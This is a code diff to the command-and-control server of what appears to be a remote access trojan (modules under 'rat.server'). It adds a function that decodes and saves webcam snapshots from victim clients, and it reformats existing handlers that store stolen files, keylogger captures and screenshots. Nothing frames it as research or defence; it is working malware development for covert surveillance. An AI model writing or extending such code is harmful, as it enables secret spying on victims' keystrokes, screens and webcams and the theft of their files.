@@ -8,7 +8,7 @@ import datetime
 import time
 import base64
 from threading import Thread
-from utils.logger import setup_logger
+from rat.utils.logger import setup_logger
 from rat.server._build_upload_payload import _build_upload_payload
 from rat.server.sessions import SessionManager
 
@@ -120,7 +120,9 @@ class SSLServer:
                 print("\n".join(lines[1:]))
                 return
             content = "\n".join(lines[2:])
-            filename = "downloaded_file_" + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = "downloaded_file_" + datetime.datetime.now().strftime(
+                "%Y%m%d_%H%M%S"
+            )
             with open(filename, "w") as f:
                 f.write(content)
             print(f"File saved: {filename}")
@@ -137,7 +139,9 @@ class SSLServer:
             if not content:
                 print("No keystrokes captured")
                 return
-            filename = "keylogger_file_" + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = "keylogger_file_" + datetime.datetime.now().strftime(
+                "%Y%m%d_%H%M%S"
+            )
             with open(filename, "w") as f:
                 f.write(content)
             print(f"Keylogger saved: {filename}")
@@ -146,6 +150,7 @@ class SSLServer:
 
     def _save_screenshot(self, response):
         import base64
+
         try:
             lines = response.split("\n")
             if lines[1] != "OK":
@@ -159,6 +164,36 @@ class SSLServer:
             print(f"Screenshot saved: {filename}")
         except Exception as e:
             print("Screenshot save error:", e)
+
+    def _save_webcam(self, response):
+
+        import base64
+        from datetime import datetime
+
+        try:
+
+            lines = response.split("\n")
+
+            if lines[1] != "OK":
+                print(response)
+
+                return
+
+            encoded = "".join(lines[2:])
+
+            image_bytes = base64.b64decode(encoded)
+
+            filename = "webcam_" f"{datetime.now().timestamp()}.jpg"
+
+            with open(filename, "wb") as f:
+
+                f.write(image_bytes)
+
+            print(f"Webcam snapshot saved: {filename}")
+
+        except Exception as e:
+
+            print("Webcam save error:", e)
 
     def _handle_response(self, response):
         lines = response.split("\n")
@@ -175,11 +210,13 @@ class SSLServer:
         elif response_type == "UPLOAD":
             # Just print the upload status
             print("\n".join(lines))
+        elif response_type == "WEBCAM":
+            self._save_webcam(response)
         else:
             print(response)
 
         # Logging
-        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD"):
+        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD", "WEBCAM"):
             logger.info("Client responded with %s", response_type)
         else:
             logger.info("Client responded: %s", response)
@@ -249,7 +286,7 @@ class SSLServer:
             while self._running:
                 if session.sock.fileno() == -1:
                     break
-                time.sleep(1)   # just keep the thread alive until disconnect
+                time.sleep(1)  # just keep the thread alive until disconnect
         finally:
             logger.info("Session %s disconnected", session.id)
             self._sessions.remove_session(session.id)
@@ -257,7 +294,6 @@ class SSLServer:
                 session.sock.close()
             except Exception:
                 pass
-
 
     def _handle_kill(self, command):
 
@@ -310,7 +346,6 @@ class SSLServer:
         print(f"Session {session_id} terminated")
 
         logger.info("Session %s killed", session_id)
-
 
     # ------------- Main interactive console -------------
     def run_console(self):
